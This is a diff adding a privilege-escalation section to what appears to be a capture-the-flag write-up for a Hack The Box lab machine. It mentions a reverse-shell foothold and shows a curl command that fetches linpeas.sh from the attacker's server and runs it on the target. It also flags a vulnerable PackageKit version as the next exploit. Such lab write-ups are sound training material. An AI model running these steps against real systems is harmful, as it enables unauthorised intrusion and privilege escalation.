@@ -41,3 +41,16 @@ After activating my Python virtual environment (`source myenv/bin/activate`) and
 - **Foothold Achieved:** Connected to `wss://nb-1be3782a8afd3ad5.cohort.htb/terminal/ws` and received a reverse shell as `marimo` (`uid=1000(marimo)`).
 - **User Flag:** Retrieved `user.txt` (`adb5c4cd99b2d0e958bd271561e666f0`).
 - **Next Step:** Enumerate local privileges (`sudo -l`, SUID binaries, cron jobs, services, and `notebooks/`) to find a privilege escalation path to `root`.
+
+## 4. Privilege Escalation Enumeration
+Started a local HTTP server on Kali (`python3 -m http.server 8000` in `~/Tools/peass/linpeas`) and transferred `linpeas.sh` to the target as `marimo`:
+
+![LinPEAS HTTP Transfer on Kali](assets/10-linpeas-http-server.png)
+![Downloading and Running LinPEAS](assets/11-linpeas-execution.png)
+- **Transfer & Execution:** Downloaded `linpeas.sh` via `curl -s http://10.10.16.229:8000/linpeas.sh -o linpeas.sh`, set executable permissions (`chmod +x linpeas.sh`), and ran `./linpeas.sh`.
+
+LinPEAS flagged a high-value local privilege escalation lead in PackageKit:
+
+![PackageKit CVE-2026-41651 Detection](assets/12-linpeas-packagekit.png)
+- **PackageKit (`CVE-2026-41651` / Pack2TheRoot):** Detected PackageKit `1.2.8-2ubuntu1.2`, which is below the Ubuntu 24.04 patched version (`1.2.8-2ubuntu1.5`). CVE-2026-41651 is a TOCTOU race condition on transaction flags in PackageKit that allows local privilege escalation.
+- **Next Step:** Exploit `CVE-2026-41651` (Pack2TheRoot) to escalate from `marimo` to `root` and retrieve `root.txt`.
